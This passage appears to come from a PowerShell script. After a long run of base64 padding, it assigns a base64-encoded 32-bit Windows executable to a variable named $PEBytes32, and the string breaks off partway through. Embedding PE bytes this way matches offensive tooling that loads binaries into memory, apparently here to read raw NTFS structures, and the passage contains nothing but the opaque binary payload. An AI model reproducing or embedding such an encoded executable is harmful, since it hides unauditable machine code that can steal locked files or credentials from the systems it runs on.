AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=="
	[String]$PEBytes32 = "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